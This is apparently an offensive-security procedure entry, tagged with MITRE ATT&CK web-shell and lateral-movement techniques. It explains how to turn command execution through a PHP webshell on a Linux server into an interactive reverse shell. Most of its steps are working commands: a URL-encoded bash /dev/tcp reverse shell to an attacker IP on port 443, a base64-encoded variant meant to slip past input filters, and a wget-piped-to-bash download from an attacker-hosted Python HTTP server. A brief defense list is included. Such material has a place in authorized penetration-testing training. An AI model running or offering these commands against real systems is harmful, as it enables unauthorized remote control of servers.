---
id: 21c10b4b-9ef8-46ab-aaee-cf316b597e74
type: procedure
verified: true
submitted: false
created_at: '2019-12-05T01:41:02.612510+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Web Shell|T1505.003 - Web Shell]]'
sub_techniques: []
platforms:
  - Linux
  - Web
tags:
  - RCE
  - Web Applications
commands:
  - '[[commands/base64-encode-command]]'
  - '[[commands/python3-launch-http-server]]'
tools:
  - '[[tools/Python]]'
validated: true
---

# Upgrade-Web-RCE-to-Reverse-Shell-on-Linux

## Summary

From a PHP webshell on a Linux web server, upgrade to an interactive reverse shell using direct execution, base64 encoding to bypass filters, or downloading a script from an attacker-controlled server.

## Description

Web RCE limits interaction; reverse shells provide terminal access. Methods include direct bash TCP shells (if unfiltered), encoding to evade blacklists, or wget/curl to fetch and pipe execution, assuming common tools like bash and wget are available.

## Requirements

- Established PHP webshell (?cmd=)
- Attacker listener (nc -lvnp 443)
- Bash 4+ on target for TCP support
- Optional: Web server on attacker for hosting scripts

## Defense

- Disable unnecessary shell commands in web contexts
- Filter special characters in input sanitization
- Monitor outbound connections from web servers

## Objectives

1. Attempt direct reverse shell execution
2. Bypass filters with encoding or download if needed
3. Achieve interactive shell for post-exploitation

## Instructions

### Step 1: Attempt Direct Reverse Shell

**Context**: URL-encode the bash command and execute via webshell; browsers handle encoding automatically.

Via browser: http://$_TARGET_IP/shell.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/$_ATTACKER_IP/443%200%3E%261

Use [[codes/Bash-TCP-Reverse-Shell-to-Port-443]] payload.

> If connects to listener, success; else proceed to encoding.

### Step 2: Base64 Encode for Bypass

**Context**: Encode the shell command to avoid character filters, decode and execute on target.

**Command** ([[commands/base64-encode-command]]):
```bash
echo -n 'bash -i >& /dev/tcp/$_ATTACKER_IP/443 0>&1' | base64 -w 0
```

Then via webshell: ?cmd=echo%20<encoded>%20|%20base64%20-d%20|%20bash

> Decodes and runs; check listener for connection.

### Step 3: Download and Execute Script

**Context**: If direct fails, host the shell script on attacker server and wget/pipe on target.

**Command** ([[commands/python3-launch-http-server]]):
```bash
python3 -m http.server 80
```

Create revshell.sh with [[codes/Bash-TCP-Reverse-Shell-to-Port-443]], then via webshell: ?cmd=wget%20$_ATTACKER_IP/revshell.sh%20-O%20-%20|%20bash

> Downloads and executes; listener receives shell.
